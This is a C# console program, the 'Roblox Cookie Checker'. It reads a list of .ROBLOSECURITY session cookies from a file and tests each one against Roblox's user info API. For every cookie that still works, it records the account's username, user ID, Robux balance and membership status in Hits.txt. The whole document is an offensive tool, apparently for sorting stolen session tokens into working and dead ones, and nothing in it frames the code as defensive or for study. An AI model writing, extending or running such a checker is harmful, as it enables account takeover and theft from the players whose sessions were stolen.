using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using Newtonsoft.Json;
using System.Threading;

namespace RobloxCookieChecker
{
    class Program
    {
        static void Main(string[] args)
        {
            int Hits = 0;
            Console.Title = "Cookie Checker By Epicmatthew23";
            string[] line = File.ReadAllLines("Cookies.txt");
            int value = line.Length;
            int oof = 0;
            int ooff = 0;
            new Thread(() =>
            {

                using (FileStream fileStream = File.OpenRead("Cookies.txt"))
                {
                    using (StreamReader streamReader = new StreamReader(fileStream, Encoding.UTF8, true, 128))
                    {
                        string linee;
                        while ((linee = streamReader.ReadLine()) != null)
                        {


                            if (oof == value)
                            {
                                Console.WriteLine("\nDone");
                                Console.Read();
                                return;
                            }
                            Console.WriteLine(linee);
                            WebClient wb = new WebClient();
                            string ss = ".ROBLOSECURITY=" + linee;
                            wb.Headers["Cookie"] = ss;
                            if (wb.DownloadString("http://www.roblox.com/mobileapi/userinfo").Contains("ThumbnailUrl"))
                            {
                                Hits++;
                                oof++;
                                JsonReader Reader = JsonConvert.DeserializeObject<JsonReader>(wb.DownloadString("http://www.roblox.com/mobileapi/userinfo"));
                                string Cooookie = "\nCookie: " + linee + " | " + "UserID: " + Reader.UserID + " | " + "Username: " + Reader.UserName + " | " + "Balance: " + Reader.RobuxBalance + " | " + "Has BuildersClub:" + Reader.IsAnyBuildersClubMember;
                                Console.WriteLine(Cooookie);
                                Console.Title = "Hits: " + Hits + " | Invalid: " + ooff;

                                using (System.IO.StreamWriter file =
                        new System.IO.StreamWriter("Hits.txt", true))
                                {
                                    file.WriteLine(Cooookie);
                                }
                                wb.Dispose();
                            }
                            else
                            {
                                ooff++;
                                oof++;
                                Console.Title = "Hits: " + Hits + " | Invalid: " + ooff;
                                wb.Dispose();


                            }
                        }
                    }
                }
            }).Start();
        }
    }
}
